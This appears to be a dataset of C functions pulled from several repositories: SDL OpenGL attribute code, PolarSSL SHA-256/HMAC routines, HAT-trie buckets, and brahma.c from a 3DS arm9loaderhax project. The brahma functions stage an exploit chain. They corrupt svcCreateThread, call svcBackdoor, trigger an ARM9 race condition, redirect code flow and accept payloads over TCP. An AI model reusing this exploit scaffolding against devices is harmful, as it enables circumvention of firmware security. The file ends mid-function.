{"docstring": "/* Get attribute data from wgl. */\n", "func_signal": "int WIN_GL_GetAttribute(_THIS, SDL_GLattr attrib, int* value)", "code": "{\n\tint retval;\n\n\tif (attrib == SDL_GL_SWAP_CONTROL) {\n\t\tif ( this->gl_data->wglGetSwapIntervalEXT ) {\n\t\t\t*value = this->gl_data->wglGetSwapIntervalEXT();\n\t\t\treturn 0;\n\t\t}\n\t\treturn -1;\n\t}\n\n\tif ( this->gl_data->wglGetPixelFormatAttribivARB ) {\n\t\tint wgl_attrib;\n\n\t\tswitch(attrib) {\n\t\t    case SDL_GL_RED_SIZE:\n\t\t\twgl_attrib = WGL_RED_BITS_ARB;\n\t\t\tbreak;\n\t\t    case SDL_GL_GREEN_SIZE:\n\t\t\twgl_attrib = WGL_GREEN_BITS_ARB;\n\t\t\tbreak;\n\t\t    case SDL_GL_BLUE_SIZE:\n\t\t\twgl_attrib = WGL_BLUE_BITS_ARB;\n\t\t\tbreak;\n\t\t    case SDL_GL_ALPHA_SIZE:\n\t\t\twgl_attrib = WGL_ALPHA_BITS_ARB;\n\t\t\tbreak;\n\t\t    case SDL_GL_DOUBLEBUFFER:\n\t\t\twgl_attrib = WGL_DOUBLE_BUFFER_ARB;\n\t\t\tbreak;\n\t\t    case SDL_GL_BUFFER_SIZE:\n\t\t\twgl_attrib = WGL_COLOR_BITS_ARB;\n\t\t\tbreak;\n\t\t    case SDL_GL_DEPTH_SIZE:\n\t\t\twgl_attrib = WGL_DEPTH_BITS_ARB;\n\t\t\tbreak;\n\t\t    case SDL_GL_STENCIL_SIZE:\n\t\t\twgl_attrib = WGL_STENCIL_BITS_ARB;\n\t\t\tbreak;\n\t\t    case SDL_GL_ACCUM_RED_SIZE:\n\t\t\twgl_attrib = WGL_ACCUM_RED_BITS_ARB;\n\t\t\tbreak;\n\t\t    case SDL_GL_ACCUM_GREEN_SIZE:\n\t\t\twgl_attrib = WGL_ACCUM_GREEN_BITS_ARB;\n\t\t\tbreak;\n\t\t    case SDL_GL_ACCUM_BLUE_SIZE:\n\t\t\twgl_attrib = WGL_ACCUM_BLUE_BITS_ARB;\n\t\t\tbreak;\n\t\t    case SDL_GL_ACCUM_ALPHA_SIZE:\n\t\t\twgl_attrib = WGL_ACCUM_ALPHA_BITS_ARB;\n\t\t\tbreak;\n\t\t    case SDL_GL_STEREO:\n\t\t\twgl_attrib = WGL_STEREO_ARB;\n\t\t\tbreak;\n\t\t    case SDL_GL_MULTISAMPLEBUFFERS:\n\t\t\twgl_attrib = WGL_SAMPLE_BUFFERS_ARB;\n\t\t\tbreak;\n\t\t    case SDL_GL_MULTISAMPLESAMPLES:\n\t\t\twgl_attrib = WGL_SAMPLES_ARB;\n\t\t\tbreak;\n\t\t    case SDL_GL_ACCELERATED_VISUAL:\n\t\t\twgl_attrib = WGL_ACCELERATION_ARB;\n\t\t\tthis->gl_data->wglGetPixelFormatAttribivARB(GL_hdc, pixel_format, 0, 1, &wgl_attrib, value);\n\t\t\tif ( *value == WGL_NO_ACCELERATION_ARB ) {\n\t\t\t\t*value = SDL_FALSE;\n\t\t\t} else {\n\t\t\t\t*value = SDL_TRUE;\n\t\t\t}\n\t\t\treturn 0;\n\t\t    default:\n\t\t\treturn(-1);\n\t\t}\n\t\tthis->gl_data->wglGetPixelFormatAttribivARB(GL_hdc, pixel_format, 0, 1, &wgl_attrib, value);\n\n\t\treturn 0;\n\t}\n\n\tretval = 0;\n\tswitch ( attrib ) {\n\t    case SDL_GL_RED_SIZE:\n\t\t*value = GL_pfd.cRedBits;\n\t\tbreak;\n\t    case SDL_GL_GREEN_SIZE:\n\t\t*value = GL_pfd.cGreenBits;\n\t\tbreak;\n\t    case SDL_GL_BLUE_SIZE:\n\t\t*value = GL_pfd.cBlueBits;\n\t\tbreak;\n\t    case SDL_GL_ALPHA_SIZE:\n\t\t*value = GL_pfd.cAlphaBits;\n\t\tbreak;\n\t    case SDL_GL_DOUBLEBUFFER:\n\t\tif ( GL_pfd.dwFlags & PFD_DOUBLEBUFFER ) {\n\t\t\t*value = 1;\n\t\t} else {\n\t\t\t*value = 0;\n\t\t}\n\t\tbreak;\n\t    case SDL_GL_BUFFER_SIZE:\n\t\t*value = GL_pfd.cColorBits;\n\t\tbreak;\n\t    case SDL_GL_DEPTH_SIZE:\n\t\t*value = GL_pfd.cDepthBits;\n\t\tbreak;\n\t    case SDL_GL_STENCIL_SIZE:\n\t\t*value = GL_pfd.cStencilBits;\n\t\tbreak;\n\t    case SDL_GL_ACCUM_RED_SIZE:\n\t\t*value = GL_pfd.cAccumRedBits;\n\t\tbreak;\n\t    case SDL_GL_ACCUM_GREEN_SIZE:\n\t\t*value = GL_pfd.cAccumGreenBits;\n\t\tbreak;\n\t    case SDL_GL_ACCUM_BLUE_SIZE:\n\t\t*value = GL_pfd.cAccumBlueBits;\n\t\tbreak;\n\t    case SDL_GL_ACCUM_ALPHA_SIZE:\n\t\t*value = GL_pfd.cAccumAlphaBits;\n\t\tbreak;\n\t    case SDL_GL_STEREO:\n\t\tif ( GL_pfd.dwFlags & PFD_STEREO ) {\n\t\t\t*value = 1;\n\t\t} else {\n\t\t\t*value = 0;\n\t\t}\n\t\tbreak;\n\t    case SDL_GL_MULTISAMPLEBUFFERS:\n\t\t*value = 0;\n\t\tbreak;\n\t    case SDL_GL_MULTISAMPLESAMPLES:\n\t\t*value = 1;\n\t\tbreak;\n\t    case SDL_GL_SWAP_CONTROL:\n\t\tif ( this->gl_data->wglGetSwapIntervalEXT ) {\n\t\t\t*value = this->gl_data->wglGetSwapIntervalEXT();\n\t\t\treturn 0;\n\t\t} else {\n\t\t\treturn -1;\n\t\t}\n\t\tbreak;\n\t    default:\n\t\tretval = -1;\n\t\tbreak;\n\t}\n\treturn retval;\n}", "path": "src\\video\\wincommon\\SDL_wingl.c", "repo_name": "coolsee/OpenMugen", "stars": 74, "license": "None", "language": "c", "size": 2140}
{"docstring": "/* should be the very first call. allocates heap buffer\n   for ARM9 payload */\n", "func_signal": "u32 brahma_init (void)", "code": "{\n\tg_ext_arm9_buf = memalign(0x1000, ARM9_PAYLOAD_MAX_SIZE);\n\treturn (g_ext_arm9_buf != 0);\n}", "path": "payload_installer\\brahma2\\source\\brahma.c", "repo_name": "jasondellaluce/arm9loaderhax", "stars": 99, "license": "gpl-2.0", "language": "c", "size": 1175}
{"docstring": "/* reads ARM9 payload from memory.\n   data: array of u8 containing the payload\n   dsize: size of the data array\n   returns: 0 on failure, 1 on success */\n", "func_signal": "s32 load_arm9_payload_from_mem (u8* data, u32 dsize)", "code": "{\n\ts32 result = 0;\n\n\tif ((data != NULL) && (dsize >= 8) && (dsize <= ARM9_PAYLOAD_MAX_SIZE)) {\n\t\tg_ext_arm9_size = dsize;\n\t\tmemcpy(g_ext_arm9_buf, data, dsize);\n\t\tresult = g_ext_arm9_loaded = 1;\n\t}\n\n\treturn result;\n}", "path": "payload_installer\\brahma2\\source\\brahma.c", "repo_name": "jasondellaluce/arm9loaderhax", "stars": 99, "license": "gpl-2.0", "language": "c", "size": 1175}
{"docstring": "/*\n * SHA-256 HMAC final digest\n */\n", "func_signal": "void sha2_hmac_finish( sha2_context *ctx, unsigned char output[32] )", "code": "{\n    int is224, hlen;\n    unsigned char tmpbuf[32];\n\n    is224 = ctx->is224;\n    hlen = ( is224 == 0 ) ? 32 : 28;\n\n    sha2_finish( ctx, tmpbuf );\n    sha2_starts( ctx, is224 );\n    sha2_update( ctx, ctx->opad, 64 );\n    sha2_update( ctx, tmpbuf, hlen );\n    sha2_finish( ctx, output );\n\n    memset( tmpbuf, 0, sizeof( tmpbuf ) );\n}", "path": "common\\pack_tool_src\\source\\polarssl\\sha2.c", "repo_name": "jasondellaluce/arm9loaderhax", "stars": 99, "license": "gpl-2.0", "language": "c", "size": 1175}
{"docstring": "/* call upon exit */\n", "func_signal": "u32 brahma_exit (void)", "code": "{\n\tif (g_ext_arm9_buf) {\n\t\tfree(g_ext_arm9_buf);\n\t}\n\treturn 1;\n}", "path": "payload_installer\\brahma2\\source\\brahma.c", "repo_name": "jasondellaluce/arm9loaderhax", "stars": 99, "license": "gpl-2.0", "language": "c", "size": 1175}
{"docstring": "/* copies ARM9 payload to FCRAM\n   - before overwriting it in memory, Brahma creates a backup copy of\n\t the mapped firm binary's ARM9 entry point. The copy will be stored\n\t into offset 4 of the ARM9 payload during run-time.\n\t This allows the ARM9 payload to resume booting the Nintendo firmware\n\t code.\n\t Thus, the format of ARM9 payload written for Brahma is the following:\n\t - a branch instruction at offset 0 and\n\t - a placeholder (u32) at offset 4 (=ARM9 entrypoint) */\n", "func_signal": "s32 map_arm9_payload (void)", "code": "{\n\tvoid *src;\n\tvolatile void *dst;\n\n\tu32 size = 0;\n\ts32 result = 0;\n\n\tdst = (void *)(g_expdata.va_fcram_base + OFFS_FCRAM_ARM9_PAYLOAD);\n\n\tif (!g_ext_arm9_loaded) {\n\t\t// default ARM9 payload\n\t\tsrc = &arm9_start;\n\t\tsize = (u8 *)&arm9_end - (u8 *)&arm9_start;\n\t}\n\telse {\n\t\t// external ARM9 payload\n\t\tsrc = g_ext_arm9_buf;\n\t\tsize = g_ext_arm9_size;\n\t}\n\n\tif (size >= 0 && size <= ARM9_PAYLOAD_MAX_SIZE) {\n\t\tmemcpy(dst, src, size);\n\t\tresult = 1;\n\t}\n\n\treturn result;\n}", "path": "payload_installer\\brahma2\\source\\brahma.c", "repo_name": "jasondellaluce/arm9loaderhax", "stars": 99, "license": "gpl-2.0", "language": "c", "size": 1175}
{"docstring": "/*\n * SHA-256 HMAC context reset\n */\n", "func_signal": "void sha2_hmac_reset( sha2_context *ctx )", "code": "{\n    sha2_starts( ctx, ctx->is224 );\n    sha2_update( ctx, ctx->ipad, 64 );\n}", "path": "common\\pack_tool_src\\source\\polarssl\\sha2.c", "repo_name": "jasondellaluce/arm9loaderhax", "stars": 99, "license": "gpl-2.0", "language": "c", "size": 1175}
{"docstring": "/* overwrites two instructions (8 bytes in total) at src_addr\n   with code that redirects execution to dst_addr */\n", "func_signal": "void redirect_codeflow (u32 *dst_addr, u32 *src_addr)", "code": "{\n\t*(src_addr + 1) = dst_addr;\n\t*src_addr = ARM_JUMPOUT;\n}", "path": "payload_installer\\brahma2\\source\\brahma.c", "repo_name": "jasondellaluce/arm9loaderhax", "stars": 99, "license": "gpl-2.0", "language": "c", "size": 1175}
{"docstring": "/* perform firmlaunch. load ARM9 payload before calling this\n   function. otherwise, calling this function simply reboots\n   the handheld */\n", "func_signal": "s32 firm_reboot (void)", "code": "{\n\ts32 fail_stage = 0;\n\n\tfail_stage++; /* platform or firmware not supported, ARM11 exploit failure */\n\tif (setup_exploit_data()) {\n\t\tfail_stage++; /* failure while trying to corrupt svcCreateThread() */\n\t\tif (khaxInit() == 0) {\n\t\t\tfail_stage++; /* Firmlaunch failure, ARM9 exploit failure*/\n\t\t\tsvcBackdoor(priv_firm_reboot);\n\t\t}\n\t}\n\n\t/* we do not intend to return ... */\n\treturn fail_stage;\n}", "path": "payload_installer\\brahma2\\source\\brahma.c", "repo_name": "jasondellaluce/arm9loaderhax", "stars": 99, "license": "gpl-2.0", "language": "c", "size": 1175}
{"docstring": "/* restore svcCreateThread code (not really required,\n   but just to be on the safe side) */\n", "func_signal": "s32 priv_firm_reboot (void)", "code": "{\n\t__asm__ volatile (\"cpsid aif\");\n\n\t// Save the framebuffers for arm9\n\tu32 *save = (u32 *)(g_expdata.va_fcram_base + 0x3FFFE00);\n\tsave[0] = topFramebufferInfo.framebuf0_vaddr;\n   \tsave[1] = topFramebufferInfo.framebuf1_vaddr;\n\tsave[2] = bottomFramebufferInfo.framebuf0_vaddr;\n\n\t// Working around a GCC bug to translate the va address to pa...\n\tsave[0] += 0xC000000;  // (pa FCRAM address - va FCRAM address)\n\tsave[1] += 0xC000000;\n\tsave[2] += 0xC000000;\n\n\texploit_arm9_race_condition();\n\treturn 0;\n}", "path": "payload_installer\\brahma2\\source\\brahma.c", "repo_name": "jasondellaluce/arm9loaderhax", "stars": 99, "license": "gpl-2.0", "language": "c", "size": 1175}
{"docstring": "/*\n * output = SHA-256( file contents )\n */\n", "func_signal": "int sha2_file( const char *path, unsigned char output[32], int is224 )", "code": "{\n    FILE *f;\n    size_t n;\n    sha2_context ctx;\n    unsigned char buf[1024];\n\n    if( ( f = fopen( path, \"rb\" ) ) == NULL )\n        return( POLARSSL_ERR_SHA2_FILE_IO_ERROR );\n\n    sha2_starts( &ctx, is224 );\n\n    while( ( n = fread( buf, 1, sizeof( buf ), f ) ) > 0 )\n        sha2_update( &ctx, buf, n );\n\n    sha2_finish( &ctx, output );\n\n    memset( &ctx, 0, sizeof( sha2_context ) );\n\n    if( ferror( f ) != 0 )\n    {\n        fclose( f );\n        return( POLARSSL_ERR_SHA2_FILE_IO_ERROR );\n    }\n\n    fclose( f );\n    return( 0 );\n}", "path": "common\\pack_tool_src\\source\\polarssl\\sha2.c", "repo_name": "jasondellaluce/arm9loaderhax", "stars": 99, "license": "gpl-2.0", "language": "c", "size": 1175}
{"docstring": "/*\n * output = HMAC-SHA-256( hmac key, input buffer )\n */\n", "func_signal": "void sha2_hmac( const unsigned char *key, size_t keylen,\n                const unsigned char *input, size_t ilen,\n                unsigned char output[32], int is224 )", "code": "{\n    sha2_context ctx;\n\n    sha2_hmac_starts( &ctx, key, keylen, is224 );\n    sha2_hmac_update( &ctx, input, ilen );\n    sha2_hmac_finish( &ctx, output );\n\n    memset( &ctx, 0, sizeof( sha2_context ) );\n}", "path": "common\\pack_tool_src\\source\\polarssl\\sha2.c", "repo_name": "jasondellaluce/arm9loaderhax", "stars": 99, "license": "gpl-2.0", "language": "c", "size": 1175}
{"docstring": "/*\n * Checkup routine\n */\n", "func_signal": "int sha2_self_test( int verbose )", "code": "{\n    int i, j, k, buflen;\n    unsigned char buf[1024];\n    unsigned char sha2sum[32];\n    sha2_context ctx;\n\n    for( i = 0; i < 6; i++ )\n    {\n        j = i % 3;\n        k = i < 3;\n\n        if( verbose != 0 )\n            printf( \"  SHA-%d test #%d: \", 256 - k * 32, j + 1 );\n\n        sha2_starts( &ctx, k );\n\n        if( j == 2 )\n        {\n            memset( buf, 'a', buflen = 1000 );\n\n            for( j = 0; j < 1000; j++ )\n                sha2_update( &ctx, buf, buflen );\n        }\n        else\n            sha2_update( &ctx, sha2_test_buf[j],\n                               sha2_test_buflen[j] );\n\n        sha2_finish( &ctx, sha2sum );\n\n        if( memcmp( sha2sum, sha2_test_sum[i], 32 - k * 4 ) != 0 )\n        {\n            if( verbose != 0 )\n                printf( \"failed\\n\" );\n\n            return( 1 );\n        }\n\n        if( verbose != 0 )\n            printf( \"passed\\n\" );\n    }\n\n    if( verbose != 0 )\n        printf( \"\\n\" );\n\n    for( i = 0; i < 14; i++ )\n    {\n        j = i % 7;\n        k = i < 7;\n\n        if( verbose != 0 )\n            printf( \"  HMAC-SHA-%d test #%d: \", 256 - k * 32, j + 1 );\n\n        if( j == 5 || j == 6 )\n        {\n            memset( buf, '\\xAA', buflen = 131 );\n            sha2_hmac_starts( &ctx, buf, buflen, k );\n        }\n        else\n            sha2_hmac_starts( &ctx, sha2_hmac_test_key[j],\n                                    sha2_hmac_test_keylen[j], k );\n\n        sha2_hmac_update( &ctx, sha2_hmac_test_buf[j],\n                                sha2_hmac_test_buflen[j] );\n\n        sha2_hmac_finish( &ctx, sha2sum );\n\n        buflen = ( j == 4 ) ? 16 : 32 - k * 4;\n\n        if( memcmp( sha2sum, sha2_hmac_test_sum[i], buflen ) != 0 )\n        {\n            if( verbose != 0 )\n                printf( \"failed\\n\" );\n\n            return( 1 );\n        }\n\n        if( verbose != 0 )\n            printf( \"passed\\n\" );\n    }\n\n    if( verbose != 0 )\n        printf( \"\\n\" );\n\n    return( 0 );\n}", "path": "common\\pack_tool_src\\source\\polarssl\\sha2.c", "repo_name": "jasondellaluce/arm9loaderhax", "stars": 99, "license": "gpl-2.0", "language": "c", "size": 1175}
{"docstring": "/*\n * output = SHA-256( input buffer )\n */\n", "func_signal": "void sha2( const unsigned char *input, size_t ilen,\n           unsigned char output[32], int is224 )", "code": "{\n    sha2_context ctx;\n\n    sha2_starts( &ctx, is224 );\n    sha2_update( &ctx, input, ilen );\n    sha2_finish( &ctx, output );\n\n    memset( &ctx, 0, sizeof( sha2_context ) );\n}", "path": "common\\pack_tool_src\\source\\polarssl\\sha2.c", "repo_name": "jasondellaluce/arm9loaderhax", "stars": 99, "license": "gpl-2.0", "language": "c", "size": 1175}
{"docstring": "/*\n * SHA-256 context setup\n */\n", "func_signal": "void sha2_starts( sha2_context *ctx, int is224 )", "code": "{\n    ctx->total[0] = 0;\n    ctx->total[1] = 0;\n\n    if( is224 == 0 )\n    {\n        /* SHA-256 */\n        ctx->state[0] = 0x6A09E667;\n        ctx->state[1] = 0xBB67AE85;\n        ctx->state[2] = 0x3C6EF372;\n        ctx->state[3] = 0xA54FF53A;\n        ctx->state[4] = 0x510E527F;\n        ctx->state[5] = 0x9B05688C;\n        ctx->state[6] = 0x1F83D9AB;\n        ctx->state[7] = 0x5BE0CD19;\n    }\n    else\n    {\n        /* SHA-224 */\n        ctx->state[0] = 0xC1059ED8;\n        ctx->state[1] = 0x367CD507;\n        ctx->state[2] = 0x3070DD17;\n        ctx->state[3] = 0xF70E5939;\n        ctx->state[4] = 0xFFC00B31;\n        ctx->state[5] = 0x68581511;\n        ctx->state[6] = 0x64F98FA7;\n        ctx->state[7] = 0xBEFA4FA4;\n    }\n\n    ctx->is224 = is224;\n}", "path": "common\\pack_tool_src\\source\\polarssl\\sha2.c", "repo_name": "jasondellaluce/arm9loaderhax", "stars": 99, "license": "gpl-2.0", "language": "c", "size": 1175}
{"docstring": "/*\n * SHA-256 final digest\n */\n", "func_signal": "void sha2_finish( sha2_context *ctx, unsigned char output[32] )", "code": "{\n    uint32_t last, padn;\n    uint32_t high, low;\n    unsigned char msglen[8];\n\n    high = ( ctx->total[0] >> 29 )\n         | ( ctx->total[1] <<  3 );\n    low  = ( ctx->total[0] <<  3 );\n\n    PUT_UINT32_BE( high, msglen, 0 );\n    PUT_UINT32_BE( low,  msglen, 4 );\n\n    last = ctx->total[0] & 0x3F;\n    padn = ( last < 56 ) ? ( 56 - last ) : ( 120 - last );\n\n    sha2_update( ctx, sha2_padding, padn );\n    sha2_update( ctx, msglen, 8 );\n\n    PUT_UINT32_BE( ctx->state[0], output,  0 );\n    PUT_UINT32_BE( ctx->state[1], output,  4 );\n    PUT_UINT32_BE( ctx->state[2], output,  8 );\n    PUT_UINT32_BE( ctx->state[3], output, 12 );\n    PUT_UINT32_BE( ctx->state[4], output, 16 );\n    PUT_UINT32_BE( ctx->state[5], output, 20 );\n    PUT_UINT32_BE( ctx->state[6], output, 24 );\n\n    if( ctx->is224 == 0 )\n        PUT_UINT32_BE( ctx->state[7], output, 28 );\n}", "path": "common\\pack_tool_src\\source\\polarssl\\sha2.c", "repo_name": "jasondellaluce/arm9loaderhax", "stars": 99, "license": "gpl-2.0", "language": "c", "size": 1175}
{"docstring": "/* fills exploit_data structure with information that is specific\n   to 3DS model and firmware version\n   returns: 0 on failure, 1 on success */\n", "func_signal": "s32 get_exploit_data (struct exploit_data *data)", "code": "{\n\tu32 fversion = 0;\n\tu8  isN3DS = 0;\n\ts32 i;\n\ts32 result = 0;\n\tu32 sysmodel = SYS_MODEL_NONE;\n\n\tif(!data)\n\t\treturn result;\n\n\tfversion = osGetFirmVersion();\n\tAPT_CheckNew3DS(&isN3DS);\n\tsysmodel = isN3DS ? SYS_MODEL_NEW_3DS : SYS_MODEL_OLD_3DS;\n\n\t/* copy platform and firmware dependent data */\n\tfor(i=0; i < sizeof(supported_systems) / sizeof(supported_systems[0]); i++) {\n\t\tif (supported_systems[i].firm_version == fversion &&\n\t\t\tsupported_systems[i].sys_model & sysmodel) {\n\t\t\t\tmemcpy(data, &supported_systems[i], sizeof(struct exploit_data));\n\t\t\t\tresult = 1;\n\t\t\t\tbreak;\n\t\t}\n\t}\n\treturn result;\n}", "path": "payload_installer\\brahma2\\source\\brahma.c", "repo_name": "jasondellaluce/arm9loaderhax", "stars": 99, "license": "gpl-2.0", "language": "c", "size": 1175}
{"docstring": "/*\n * SHA-256 process buffer\n */\n", "func_signal": "void sha2_update( sha2_context *ctx, const unsigned char *input, size_t ilen )", "code": "{\n    size_t fill;\n    uint32_t left;\n\n    if( ilen <= 0 )\n        return;\n\n    left = ctx->total[0] & 0x3F;\n    fill = 64 - left;\n\n    ctx->total[0] += (uint32_t) ilen;\n    ctx->total[0] &= 0xFFFFFFFF;\n\n    if( ctx->total[0] < (uint32_t) ilen )\n        ctx->total[1]++;\n\n    if( left && ilen >= fill )\n    {\n        memcpy( (void *) (ctx->buffer + left), input, fill );\n        sha2_process( ctx, ctx->buffer );\n        input += fill;\n        ilen  -= fill;\n        left = 0;\n    }\n\n    while( ilen >= 64 )\n    {\n        sha2_process( ctx, input );\n        input += 64;\n        ilen  -= 64;\n    }\n\n    if( ilen > 0 )\n        memcpy( (void *) (ctx->buffer + left), input, ilen );\n}", "path": "common\\pack_tool_src\\source\\polarssl\\sha2.c", "repo_name": "jasondellaluce/arm9loaderhax", "stars": 99, "license": "gpl-2.0", "language": "c", "size": 1175}
{"docstring": "/* get system dependent data and set up ARM11 structures */\n", "func_signal": "s32 setup_exploit_data (void)", "code": "{\n\ts32 result = 0;\n\n\tif (get_exploit_data(&g_expdata)) {\n\t\t/* copy data required by code running in ARM11 svc mode */\n\t\tg_arm11shared.va_hook1_ret = g_expdata.va_hook1_ret;\n\t\tg_arm11shared.va_pdn_regs = g_expdata.va_pdn_regs;\n\t\tg_arm11shared.va_pxi_regs = g_expdata.va_pxi_regs;\n\t\tresult = 1;\n\t}\n\treturn result;\n}", "path": "payload_installer\\brahma2\\source\\brahma.c", "repo_name": "jasondellaluce/arm9loaderhax", "stars": 99, "license": "gpl-2.0", "language": "c", "size": 1175}
{"docstring": "/*\n * SHA-256 HMAC context setup\n */\n", "func_signal": "void sha2_hmac_starts( sha2_context *ctx, const unsigned char *key, size_t keylen,\n                       int is224 )", "code": "{\n    size_t i;\n    unsigned char sum[32];\n\n    if( keylen > 64 )\n    {\n        sha2( key, keylen, sum, is224 );\n        keylen = ( is224 ) ? 28 : 32;\n        key = sum;\n    }\n\n    memset( ctx->ipad, 0x36, 64 );\n    memset( ctx->opad, 0x5C, 64 );\n\n    for( i = 0; i < keylen; i++ )\n    {\n        ctx->ipad[i] = (unsigned char)( ctx->ipad[i] ^ key[i] );\n        ctx->opad[i] = (unsigned char)( ctx->opad[i] ^ key[i] );\n    }\n\n    sha2_starts( ctx, is224 );\n    sha2_update( ctx, ctx->ipad, 64 );\n\n    memset( sum, 0, sizeof( sum ) );\n}", "path": "common\\pack_tool_src\\source\\polarssl\\sha2.c", "repo_name": "jasondellaluce/arm9loaderhax", "stars": 99, "license": "gpl-2.0", "language": "c", "size": 1175}
{"docstring": "/* TODO: network code might be moved somewhere else */\n", "func_signal": "s32 recv_arm9_payload (void)", "code": "{\n\ts32 sockfd;\n\tstruct sockaddr_in sa;\n\ts32 ret;\n\tu32 kDown, old_kDown;\n\ts32 clientfd;\n\tstruct sockaddr_in client_addr;\n\ts32 addrlen = sizeof(client_addr);\n\ts32 sflags = 0;\n\n\tif ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {\n\t\tprintf(\"[!] Error: socket()\\n\");\n\t\treturn 0;\n\t}\n\n\tbzero(&sa, sizeof(sa));\n\tsa.sin_family = AF_INET;\n\tsa.sin_port = htons(BRAHMA_NETWORK_PORT);\n\tsa.sin_addr.s_addr = gethostid();\n\n\tif (bind(sockfd, (struct sockaddr*)&sa, sizeof(sa)) != 0) {\n\t\tprintf(\"[!] Error: bind()\\n\");\n\t\tclose(sockfd);\n\t\treturn 0;\n\t}\n\n\tif (listen(sockfd, 1) != 0) {\n\t\tprintf(\"[!] Error: listen()\\n\");\n\t\tclose(sockfd);\n\t\treturn 0;\n\t}\n\n\tprintf(\"[x] IP %s:%d\\n\", inet_ntoa(sa.sin_addr), BRAHMA_NETWORK_PORT);\n\n\tg_ext_arm9_size = 0;\n\tg_ext_arm9_loaded = 0;\n\n\tsflags = fcntl(sockfd, F_GETFL);\n\tif (sflags == -1) {\n\t\tprintf(\"[!] Error: fcntl() (1)\\n\");\n\t\tclose(sockfd);\n\t}\n\tfcntl(sockfd, F_SETFL, sflags | O_NONBLOCK);\n\n\thidScanInput();\n\told_kDown = hidKeysDown();\n\twhile (1) {\n\t\thidScanInput();\n\t\tkDown = hidKeysDown();\n\t\tif (kDown != old_kDown) {\n\t\t\tprintf(\"[!] Aborted\\n\");\n\t\t\tclose(sockfd);\n\t\t\treturn 0;\n\t\t}\n\n\t\tclientfd = accept(sockfd, (struct sockaddr*)&client_addr, &addrlen);\n\t\tsvcSleepThread(100000000);\n\t\tif (clientfd > 0)\n\t\t\tbreak;\n\t}\n\n\tprintf(\"[x] Connection from %s:%d\\n\\n\", inet_ntoa(client_addr.sin_addr),\n\tntohs(client_addr.sin_port));\n\n\ts32 recvd;\n\tu32 total = 0;\n\ts32 overflow = 0;\n\twhile ((recvd = recv(clientfd, g_ext_arm9_buf + total,\n\t\t\t\t\t\t ARM9_PAYLOAD_MAX_SIZE - total, 0)) != 0) {\n\t\tif (recvd != -1) {\n\t\t\ttotal += recvd;\n\t\t\tprintf(\".\");\n\t\t}\n\t\tif (total >= ARM9_PAYLOAD_MAX_SIZE) {\n\t\t\toverflow = 1;\n\t\t\tprintf(\"[!] Error: invalid payload size\\n\");\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tfcntl(sockfd, F_SETFL, sflags & ~O_NONBLOCK);\n\n\tprintf(\"\\n\\n[x] Received %d bytes in total\\n\", total);\n\tg_ext_arm9_size = overflow ? 0 : total;\n\tg_ext_arm9_loaded = (g_ext_arm9_size != 0);\n\n\tclose(clientfd);\n\tclose(sockfd);\n\n\treturn g_ext_arm9_loaded;\n}", "path": "payload_installer\\brahma2\\source\\brahma.c", "repo_name": "jasondellaluce/arm9loaderhax", "stars": 99, "license": "gpl-2.0", "language": "c", "size": 1175}
{"docstring": "//\treturn 1 on success\n//\t  or 0 if bucket overflows\n", "func_signal": "int hat_add_bucket (Hat *hat, HatSlot *parent, uchar *buff, uint amt, uchar *value)", "code": "{\nHatBucket *bucket;\nuchar *cell;\nuint code;\n\n\tbucket = (HatBucket *)(*parent & HAT_mask);\n\tcode = hat_code (buff, amt) % HatBucketSlots;\n\n\tif( bucket->count++ < HatBucketMax )\n\t if( !bucket->slots[code] ) {\n\t  cell = hat_new_array (hat, &bucket->slots[code], buff, amt);\n\t  if( hat->aux )\n\t\tmemcpy (cell, value, hat->aux);\n\t  return 1;\n\t } else if( (bucket->slots[code] & HAT_type) == HAT_array ) {\n\t  if( cell = hat_add_array (hat, &bucket->slots[code], buff, amt, 1) ) {\n\t    memcpy (cell, value, hat->aux);\n\t\treturn 1;\n\t  } else\n\t\treturn 0;\n\t } else\n\t  if( cell = hat_add_pail (hat, &bucket->slots[code], buff, amt) ) {\n\t    memcpy (cell, value, hat->aux);\n\t    return 1;\n\t  } else\n\t\treturn 0;\n\n\treturn 0;\n}", "path": "hattrie64d.c", "repo_name": "malbrain/HatTrie", "stars": 79, "license": "None", "language": "c", "size": 144}
{"docstring": "//\tmake new hat array node\n//\tto contain new key\n//\tguaranteed to fit\n", "func_signal": "void *hat_new_array (Hat *hat, HatSlot *parent, uchar *buff, uint amt)", "code": "{\nuint type = HAT_1;\nHatBase *base;\nushort skip;\n\n\tif( amt > 0x7f )\n\t\tskip = 2;\n\telse\n\t\tskip = 1;\n\n\twhile( hat->aux + amt + skip + sizeof(HatBase) > HatSize[type] )\n\t\ttype++;\n\n\t//\tnew key doesn't fit into largest array\n\n\tif( type > HatMax )\n\t\treturn NULL;\n\n\tbase = hat_alloc (hat, type);\n\t*parent = (HatSlot)base | HAT_array;\n\n\tbase->keys[0] = amt & 0x7f;\n\n\tif( amt > 0x7f )\n\t\tbase->keys[0] |= 0x80, base->keys[1] = amt >> 7;\n\n\tmemcpy (base->keys + skip, buff, amt);\n\tbase->nxt = amt + skip;\n\tbase->type = type;\n\tbase->cnt = 1;\n\treturn (uchar *)base + HatSize[type] - hat->aux;\n}", "path": "hattrie64d.c", "repo_name": "malbrain/HatTrie", "stars": 79, "license": "None", "language": "c", "size": 144}
{"docstring": "//\tdecompose full bucket to radix node\n", "func_signal": "void hat_burst_bucket (Hat *hat, HatSlot *parent)", "code": "{\nHatPail *pail, *chain;\nHatBucket *bucket;\nHatSlot *radix;\nHatBase *base;\nuint hash, idx;\nushort tst, cnt;\nuchar len;\n\n  bucket = (HatBucket *)(*parent & HAT_mask);\n\n  if( bucket->count < HatBucketMax )\n\tSmall++;\n\n  //\tallocate new hat_radix node\n\n  radix = hat_alloc (hat, HAT_radix);\n  *parent = (HatSlot)radix | HAT_radix;\n\n  for( hash = 0; hash < HatBucketSlots; hash++ )\n   if( bucket->slots[hash] )\n    switch( bucket->slots[hash] & HAT_type ) {\n    case HAT_array:\n\t  base = (HatBase *)(bucket->slots[hash] & HAT_mask);\n\t  cnt = tst = 0;\n\n\t  while( tst < base->nxt ) {\n\t\tlen = base->keys[tst++];\n\t\tif( len > 0x7f )\n\t\t\tlen &= 0x7f, len += base->keys[tst++] << 7;\n\t\that_add_radix (hat, radix, base->keys + tst, len, (uchar *)base + HatSize[base->type] - (cnt + 1) * hat->aux);\n\t\ttst += len;\n\t\tcnt++;\n\t  }\n\n\t  hat_free (hat, base, base->type);\n\t  continue;\n\n\tcase HAT_pail:\n\t  pail = (HatPail *)(bucket->slots[hash] & HAT_mask);\n\n\t  for( idx = 